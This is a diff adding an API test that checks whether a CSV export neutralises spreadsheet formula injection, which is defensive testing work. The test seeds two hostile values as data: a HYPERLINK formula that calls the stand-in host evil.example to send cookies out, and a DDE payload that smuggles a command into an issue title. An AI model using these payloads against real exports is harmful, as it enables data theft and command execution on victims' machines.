@@ -153,6 +153,37 @@ describe('POST /api/search/export — CSV', () => {
     expect(res.body.error).toBe('NO_VALID_COLUMNS');
   });
 
+  it('wraps cells starting with =/+/-/@ to neutralise CSV formula injection', async () => {
+    // Create a project whose name is an Excel formula payload.
+    const danger = await request
+      .post('/api/projects')
+      .set('Authorization', `Bearer ${adminToken}`)
+      .send({ name: '=HYPERLINK("http://evil.example/cookie","click")', key: 'DGR' });
+
+    await request
+      .post(`/api/projects/${danger.body.id}/issues`)
+      .set('Authorization', `Bearer ${adminToken}`)
+      .send({ title: '+cmd|" /C calc"!A1', issueTypeConfigId: taskTypeId });
+
+    const res = await request
+      .post('/api/search/export')
+      .set('Authorization', `Bearer ${adminToken}`)
+      .send({
+        jql: `project = "DGR"`,
+        format: 'csv',
+        columns: ['project', 'summary'],
+      });
+    expect(res.status).toBe(200);
+    // The raw response must have the formula cell wrapped in quotes — verify by
+    // substring search (before CSV parse, which would strip quoting).
+    expect(res.text).toContain('"=HYPERLINK(');
+    expect(res.text).toContain('"+cmd|');
+    // Round-trip through the test parser to confirm the values survive.
+    const rows = parseCsv(res.text);
+    expect(rows[1][0]).toBe('=HYPERLINK("http://evil.example/cookie","click")');
+    expect(rows[1][1]).toBe('+cmd|" /C calc"!A1');
+  });
+
   it('escapes CSV special chars (comma, quote, newline)', async () => {
     const res = await request
       .post('/api/search/export')
